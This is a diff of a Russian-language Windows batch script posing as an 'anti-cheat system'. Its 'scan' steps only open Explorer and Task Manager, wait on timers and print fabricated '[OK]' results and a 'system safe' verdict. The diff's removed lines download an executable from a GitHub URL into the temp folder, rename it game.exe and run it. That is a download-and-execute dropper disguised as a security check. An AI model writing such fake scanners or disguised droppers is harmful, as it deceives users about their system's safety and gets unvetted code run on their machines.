@@ -1,36 +1,53 @@
 @echo off
 chcp 1251 >nul
+color 0A
 
-echo === АНТИЧИТ СИСТЕМА ===
+echo =================================
+echo     АНТИЧИТ СИСТЕМА v2.0
+echo =================================
 echo.
-echo Проверка 1/5: Диск C:\
+echo Нажмите любую клавишу для начала проверки...
+pause >nul
+
+echo.
+echo [1/5] Сканирование диска C:\
 explorer C:\
 timeout /t 3 /nobreak >nul
+echo   [OK] Проверено
 
-echo Проверка 2/5: Временные файлы
+echo.
+echo [2/5] Анализ временных файлов
 explorer %temp%
 timeout /t 3 /nobreak >nul
+echo   [OK] Проверено
 
-echo Проверка 3/5: Системные папки
+echo.
+echo [3/5] Проверка системных папок
 explorer C:\Windows
 timeout /t 3 /nobreak >nul
+echo   [OK] Проверено
 
-echo Проверка 4/5: Программы
-explorer "C:\Program Files"
-timeout /t 3 /nobreak >nul
+echo.
+echo [4/5] Мониторинг процессов
+taskmgr
+timeout /t 4 /nobreak >nul
+echo   [OK] Проверено
 
-echo Проверка 5/5: Финальный анализ
+echo.
+echo [5/5] Финальный анализ
 timeout /t 5 /nobreak >nul
+echo   [OK] Проверено
 
 echo.
-echo === РЕЗУЛЬТАТ ===
-echo Читов не обнаружено!
-echo Система безопасна
+echo =================================
+echo      РЕЗУЛЬТАТ ПРОВЕРКИ
+echo =================================
 echo.
-
-echo Загрузка программы...
-powershell -Command "Invoke-WebRequest 'https://github.com/gseff137-afk/1111/raw/refs/heads/main/cheker.exe' -OutFile '%temp%\game.exe' -UseBasicParsing"
-
-echo Запуск...
-timeout /t 2 /nobreak >nul
-start "" "%temp%\game.exe"
+echo ✓ Читы не обнаружены
+echo ✓ Вредоносные файлы: 0
+echo ✓ Система безопасна
+echo ✓ Статус: ЗЕЛЕНЫЙ
+echo.
+echo =================================
+echo.
+pause
